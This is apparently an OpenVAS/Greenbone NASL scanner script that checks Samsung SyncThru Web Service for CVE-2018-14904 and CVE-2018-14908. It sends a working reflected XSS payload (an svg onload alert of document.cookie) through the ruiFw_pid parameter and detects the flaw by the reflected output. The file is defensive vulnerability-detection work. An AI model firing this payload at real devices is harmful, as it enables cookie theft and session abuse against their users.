# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:samsung:syncthru_web_service";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.813745");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2018-14904", "CVE-2018-14908");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-09-27 17:21:00 +0000 (Thu, 27 Sep 2018)");
  script_tag(name:"creation_date", value:"2018-08-06 18:50:27 +0530 (Mon, 06 Aug 2018)");

  script_name("Samsung Syncthru Web Service Multiple Vulnerabilities (Jul 2018)");

  script_tag(name:"summary", value:"Samsung Syncthru Web Service is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks
  whether it is possible to read a cookie or not.");

  script_tag(name:"insight", value:"Multiple flaws exist due to:

  - Improper sanitization of user input data like via 'ruiFw_pid' parameter

  - Lack of protection against CSRF attacks.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to conduct CSRF attacks and inject arbitrary web script or HTML in
  a user's browser session within the trust relationship between their browser
  and the server.");

  script_tag(name:"affected", value:"All versions of Samsung Syncthru Web Service.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://medium.com/stolabs/security-issues-on-samsung-syncthru-web-service-cc86467d2df");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_samsung_syncthru_web_service_detect.nasl");
  script_mandatory_keys("Samsung/SyncThru/Web/Service/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/sws/leftmenu.jsp?ruiFw_id=activeAlert&ruiFw_pid=</script>" +
            "svg/onload=alert(document.cookie)>&ruiFw_title=Information";

if(http_vuln_check(port:port, url:url, pattern:"</script>svg/onload=alert\(document\.cookie\)>",
                   extra_check:make_list("swsLeftMenuFrame", "'Information'", "'activeAlert'"),
                   check_header:TRUE)) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
